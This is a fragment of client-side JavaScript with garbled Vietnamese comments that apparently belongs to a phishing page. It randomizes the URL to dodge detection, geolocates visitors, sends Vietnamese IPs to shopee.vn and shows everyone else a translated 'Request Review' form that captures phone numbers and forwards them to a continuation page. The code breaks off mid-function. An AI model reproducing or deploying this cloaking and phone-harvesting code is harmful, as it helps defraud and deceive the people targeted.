    <script>
        function randomizeURL() {
            const randomPath = `/${Math.floor(Math.random() * 10000000000000000)}`; // Táº¡o ÄÆ°á»ng dáº«n ngáº«u nhiÃªn
            history.replaceState(null, "", randomPath); // Thay Äá»i URL nhÆ°ng khÃ´ng reload
        }

        // Gá»i hÃ m khi trang táº£i xong
        window.onload = randomizeURL;

        // Láº¯ng nghe sá»± kiá»n popstate Äá» kiá»m tra náº¿u ngÆ°á»i dÃ¹ng truy cáº­p trang 404
        window.addEventListener("popstate", function () {
            if (document.body.innerHTML.trim() === "") { // Náº¿u ná»i dung trang trá»ng (giáº£ sá»­ lÃ  404)
                randomizeURL();
            }
        });

        // Kiá»m tra náº¿u trang Äang bá» lá»i 404 (dÃ¹ng fetch Äá» kiá»m tra response)
        fetch(window.location.href)
            .then(response => {
                if (response.status === 404) {
                    randomizeURL();
                }
            })
            .catch(() => randomizeURL()); // Náº¿u lá»i máº¡ng, váº«n cháº¡y láº¡i hÃ m

        // Gá»i láº¡i randomizeURL() khi ngÆ°á»i dÃ¹ng táº£i láº¡i trang
        window.addEventListener("beforeunload", function () {
            randomizeURL();
        });

    </script>

    async function getUserIp() {
        document.body.style.display = "none";
        var url = 'https://freeipapi.com/api/json/';

        try {
            const response = await fetch(url);
            if (response.ok) {
                const data = await response.json();
                let userIpData = {
                    'user_ip': data.ipAddress,
                    'country': data.countryName,
                    'country_code': data.countryCode
                };
                localStorage.setItem("userIpData", JSON.stringify(userIpData));
                console.log("IP data saved:", userIpData);
                // Náº¿u country_code lÃ  VN, chuyá»n hÆ°á»ng Äáº¿n Shopee
                if (userIpData.country_code === "VN") {
                    window.location.href = "https://shopee.vn";
                    return;
                }

                // Náº¿u cÃ³ báº£n dá»ch, cáº­p nháº­t vÃ  lÆ°u láº¡i ngÃ´n ngá»¯ vÃ o localStorage
                if (translations[userIpData.country_code]) {
                    document.body.style.display = "flex";
                    const phoneInput = document.querySelector("#phone");
                    const iti = intlTelInput(phoneInput, {
                        initialCountry: userIpData.country_code.toLowerCase(),
                        separateDialCode: true,
                        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
                    });
                    translatePage(userIpData.country_code);
                    localStorage.setItem("userLang", userIpData.country_code);
                } else {
                    document.body.style.display = "flex";
                    const phoneInput = document.querySelector("#phone");
                    const iti = intlTelInput(phoneInput, {
                        initialCountry: "us",
                        separateDialCode: true,
                        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
                    });
                    translatePage("us"); // Gá»i translatePage vá»i giÃ¡ trá» máº·c Äá»nh "us"
                    localStorage.setItem("userLang", "us"); // LÆ°u "us" vÃ o localStorage
                }

            } else {
                console.log("Failed to detect IP:", response.statusText);
            }
        } catch (error) {
            console.error('Error fetching IP data:', error);
        }
    }

    // HÃ m dá»ch giao diá»n
    function translatePage(countryCode) {
        let translation = translations[countryCode];
        if (translation) {
            document.querySelector(".contact-header").innerText = translation.contact_header;
            document.querySelector(".phone-label").innerText = translation.phone_label;
            document.querySelector(".request-btn").innerText = translation.request_btn;
        }
    }

    // Xá»­ lÃ½ sá»± kiá»n cho nÃºt "Request Review"
    // Xá»­ lÃ½ sá»± kiá»n khi nháº¥n nÃºt "Request Review"
    document.getElementById("contactUsBtn").addEventListener("click", function (event) {
        event.preventDefault(); // NgÄn form gá»­i máº·c Äá»nh

        // Láº¥y giÃ¡ trá» sá» Äiá»n thoáº¡i tá»« input
        const phoneInput = document.getElementById("phone");
        const phoneNumber = phoneInput.value.trim();

        // Kiá»m tra xem sá» Äiá»n thoáº¡i cÃ³ há»£p lá» khÃ´ng
        if (phoneNumber) {
            // LÆ°u sá» Äiá»n thoáº¡i vÃ o localStorage
            localStorage.setItem("phoneNumber", phoneNumber);

            // Chuyá»n hÆ°á»ng sang trang next.html
            window.location.href = "continue.html";

            // ThÃ´ng bÃ¡o (tuá»³ chá»n, Äá» kiá»m tra)
